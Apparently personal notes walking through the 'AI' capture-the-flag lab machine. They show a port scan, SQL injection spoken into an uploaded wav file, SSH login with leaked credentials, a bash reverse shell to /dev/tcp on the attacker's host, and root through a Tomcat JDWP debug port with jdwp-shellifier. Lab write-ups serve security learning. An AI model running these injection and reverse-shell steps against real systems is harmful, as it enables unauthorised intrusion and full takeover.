@@ -1,0 +1,300 @@
+Machine-Name   :   AI
+IP-Address     :   10.129.73.72
+
+Command-Line: sudo nmap -A 10.129.73.72
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-20 04:13 EST
+    Nmap scan report for 10.129.73.72
+    Host is up (0.054s latency).
+    Not shown: 998 closed ports
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   2048 6d:16:f4:32:eb:46:ca:37:04:d2:a5:aa:74:ed:ab:fc (RSA)
+    |   256 78:29:78:d9:f5:43:d1:cf:a0:03:55:b1:da:9e:51:b6 (ECDSA)
+    |_  256 85:2e:7d:66:30:a6:6e:30:04:82:c1:ae:ba:a4:99:bd (ED25519)
+    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+    |_http-server-header: Apache/2.4.29 (Ubuntu)
+    |_http-title: Hello AI!
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+    TCP/IP fingerprint:
+    OS:SCAN(V=7.91%E=4%D=12/20%OT=22%CT=1%CU=34569%PV=Y%DS=2%DC=T%G=Y%TM=5FDF15
+    OS:D1%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OP
+    OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
+    OS:11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
+    OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+    OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+    OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+    OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+    OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+    OS:D=S)
+
+    Network Distance: 2 hops
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    TRACEROUTE (using port 3306/tcp)
+    HOP RTT      ADDRESS
+    1   50.44 ms 10.10.14.1
+    2   51.60 ms 10.129.73.72
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 23.61 seconds
+
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt -f -t 50 -i 200,301 -u http://10.129.73.72
+Result:
+      _|. _ _  _  _  _ _|_    v0.4.0
+     (_||| _) (/_(_|| (_| )
+
+    Extensions: php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 882080
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-20-12-20_04-21-23.log
+
+    Target: http://10.129.73.72/
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/10.129.73.72/_20-12-20_04-21-23.txt
+
+    [04:21:23] Starting:
+    [04:21:24] 200 -   36KB - /index.php
+    [04:21:24] 301 -  315B  - /images  ->  http://10.129.73.72/images/
+    [04:21:27] 301 -  316B  - /uploads  ->  http://10.129.73.72/uploads/
+    [04:21:28] 200 -   36KB - /contact.php
+    [04:21:29] 200 -   37KB - /about.php
+    [04:21:31] 200 -    0B  - /db.php
+    [04:21:43] 200 -   38KB - /intelligence.php
+    [04:21:45] 200 -   37KB - /ai.php
+
+    Task Completed
+
+
+Browser: http://10.129.73.72/intelligence.php
+Notes: Found instructions on how to SQL Inject through .wav file.
+
+
+Browser: http://ai.htb/ai.php
+Notes: Found "Speech to text" processing. Enter a .wav file and have it processed to text.
+Possible-Exploits: SQL-Injection
+
+Command-Line: echo "open single quote, join, select, username from users comment database" | text2wave -o wav-file.wav
+Notes: Uploaded wav-file.wav to http://ai.htb/ai.php
+Result:
+    Our understanding of your input is : 'union select username from users -- -
+    Query result : alexa
+
+Notes: Possible-Username: alexa
+
+
+
+Command-Line: echo "open single quote, join, select, password from users comment database" | text2wave -o wav-file.wav
+Notes: Uploaded wav-file.wav to http://ai.htb/ai.php
+Result:
+    Our understanding of your input is : 'union select username from users -- -
+    Query result : H,Sq9t6}a<)?q93_
+
+Result:
+    Our understanding of your input is : 'union select password from users -- -
+    Query result : H,Sq9t6}a<)?q93_
+
+Notes: Possible-Password: H,Sq9t6}a<)?q93_
+
+
+
+Command-Line: ssh alexa@10.129.73.72
+Password: H,Sq9t6}a<)?q93_
+Result:
+    *** USER ACCESS GRANTED ***
+
+alexa@AI:~$ cat user.txt
+Result: c43b62c682a8c0992eb6d4a2cda55e4b
+    *** USER OWNED ***
+
+
+Attempting root access ...
+
+
+Command-Line: ~/HackingTools/LinEnum$ sudo python3 -m http.server --bind 10.10.14.147 80
+Result:
+    Serving HTTP on 10.10.14.147 port 80 (http://10.10.14.147:80/) ...
+
+alexa@AI:~$ curl 10.10.14.147/LinEnum.sh -o linEnum.sh
+Result:
+      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                     Dload  Upload   Total   Spent    Left  Speed
+    100 46631  100 46631    0     0  28295      0  0:00:01  0:00:01 --:--:-- 28295
+
+
+alexa@AI:~$ bash linEnum.sh
+Result:
+    [-] Kernel information:
+    Linux AI 5.3.7-050307-generic #201910180652 SMP Fri Oct 18 10:56:47 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+
+
+    [-] Kernel information (continued):
+    Linux version 5.3.7-050307-generic (kernel@tangerine) (gcc version 9.2.1 20191008 (Ubuntu 9.2.1-9ubuntu2)) #201910180652 SMP Fri Oct 18 10:56:47 UTC 2019
+
+    [-] Hostname:
+    AI
+
+
+    ### USER/GROUP ##########################################
+    [-] Current user/group info:
+    uid=1000(alexa) gid=1000(alexa) groups=1000(alexa)
+
+
+    [-] Users that have previously logged onto the system:
+    Username         Port     From             Latest
+    root             tty1                      Mon Nov  4 09:42:18 +0000 2019
+    alexa            pts/0    10.10.14.147     Tue Dec 22 00:04:30 +0000 2020
+
+
+    [-] Who else is logged on:
+     00:11:39 up 17 min,  1 user,  load average: 0.00, 0.01, 0.03
+    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+    alexa    pts/0    10.10.14.147     00:04    3.00s  0.07s  0.00s bash linEnum.sh
+
+
+
+
+linpeas.sh:
+    root     129849  8.7  5.3 3137572 106924 ?      Sl   20:18   0:04 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
+
+Notes:
+    jdwp=transport=dt_socket,address=localhost:8000
+    base=/opt/apache-tomcat-9.0.27
+
+
+alexa@AI:/var/www/html$ cat db.php
+Result:
+    <?php
+    $conn = new mysqli('localhost','dbuser','toor','alexa');
+    if (mysqli_connect_errno())
+      {
+      echo "Failed to connect to MySQL: " . mysqli_connect_error();
+      }
+    ?>
+
+MYSQL: Username,Password,Database = dbuser,toor,alexa
+
+alexa@AI:/var/www/html$ mysql -u dbuser -p
+Password: toor
+Result: *** ACCESS GRANTED ***
+
+
+mysql> use alexa;
+mysql> show tables;
+Result:
+    +-----------------+
+    | Tables_in_alexa |
+    +-----------------+
+    | alexa           |
+    | users           |
+    +-----------------+
+
+
+mysql> describe users;
+Result:
+    +----------+------------------+
+    | username | password         |
+    +----------+------------------+
+    | alexa    | H,Sq9t6}a<)?q93_ |
+    | root     | H,Sq9t6}a<)?q931 |
+    | dbuser   | toor             |
+    | awsadm   | awsadm           |
+    +----------+------------------+
+
+
+ssh root@10.129.73.72
+Password: H,Sq9t6}a<)?q931
+Result: *** FAILED ***
+
+
+Notes: `ss -lntp` similar to NetStat.
+Command-Line: ss -lntp
+Result:
+State        Recv-Q       Send-Q             Local Address:Port             Peer Address:Port       Process
+LISTEN       0            244                    127.0.0.1:5432                  0.0.0.0:*
+LISTEN       0            244                    127.0.0.1:5433                  0.0.0.0:*
+LISTEN       0            244                        [::1]:5432                     [::]:*
+LISTEN       0            244                        [::1]:5433                     [::]:*
+
+
+alexa@AI:~$ ss -lntp
+Result:
+    State        Recv-Q        Send-Q                     Local Address:Port                Peer Address:Port
+    LISTEN       0             80                             127.0.0.1:3306                     0.0.0.0:*
+    LISTEN       0             128                        127.0.0.53%lo:53                       0.0.0.0:*
+    LISTEN       0             128                              0.0.0.0:22                       0.0.0.0:*
+    LISTEN       0             1                              127.0.0.1:8000                     0.0.0.0:*
+    LISTEN       0             100                   [::ffff:127.0.0.1]:8009                           *:*
+    LISTEN       0             100                   [::ffff:127.0.0.1]:8080                           *:*
+    LISTEN       0             128                                    *:80                             *:*
+    LISTEN       0             128                                 [::]:22                          [::]:*
+
+
+
+
+Command-Line: "ssh -L 8009:127.0.0.1:8009 -L 8080:127.0.0.1:8080 alexa@10.129.73.72"  <<-- DID NOT WORK.
+
+Notes: `AllowTcpForwarding` set to `yes` in file:`/etc/ssh/sshd_config`.
+
+
+Browser: 127.0.0.1:8080
+Result: Apache Tomcat/9.0.27 starting page.
+Notes: Unable to login using default credentials. Searching for Tomcat within file system.
+Notes: For some reason, the `protonvpn` VPN is getting in the way of the SSH tunnel. It worked 1 time and then was never able to access Tomcat again.
+
+alexa@AI:~$ cd /tmp
+alexa@AI:/tmp$ nano rvshell.sh
+File-Contents:
+    #!/bin/bash
+    bash -c 'bash -i >& /dev/tcp/10.10.14.89/9123 0>&1'
+alexa@AI:~$ ~C
+ssh> -L8000:127.0.0.1:8000
+Result:
+    Forwarding port.
+
+alexa@AI:/tmp$
+Command-Line: nc -nlvp 9123
+Result:
+    listening on [any] ...
+
+
+Searchef-URL: https://www.tutorialspoint.com/java/lang/string_indexof_ch.htm
+Command-Line: ~/HackingTools/jdwp-shellifier$ ./jdwp-shellifier.py -t 127.0.0.1 --break-on "java.lang.String.indexOf" --cmd "/tmp/rvshell.sh"
+Result:
+    [+] Targeting '127.0.0.1:8000'
+    [+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.4'
+    [+] Found Runtime class: id=b8d
+    [+] Found Runtime.getRuntime(): id=7f7b58005f58
+    [+] Created break event id=2
+    [+] Waiting for an event on 'java.lang.String.indexOf'
+    [+] Received matching event from thread 0xc32
+    [+] Selected payload '/tmp/rvshell.sh'
+    [+] Command string object created id:c33
+    [+] Runtime.getRuntime() returned context id:0xc34
+    [+] found Runtime.exec(): id=7f7b58005f90
+    [+] Runtime.exec() successful, retId=c35
+    [!] Command successfully executed
+
+Notes: nc listener picked up the command and turned into a root shell.
+    *** ROOT ACCESS ***
+
+listening on [any] 9123 ...
+connect to [10.10.14.89] from (UNKNOWN) [10.129.73.72] 49290
+bash: cannot set terminal process group (3505): Inappropriate ioctl for device
+bash: no job control in this shell
+root@AI:~# cat root.txt
+Result:
+    cat root.txt
+    0ed04f28c579bf7508a0566529a8eaa3
+    root@AI:~#
+    *** ROOT OWNED ***
+
+Notes: Did not have the "jdb" tool installed for java.
+URL: https://www.codegrepper.com/code-examples/shell/openjdk+11+install+ubuntu
+Install-Commands:
+    sudo apt-get update && sudo apt-get upgrade
+    sudo apt-get install default-jdk
+
+
+    *** FINISHED ***
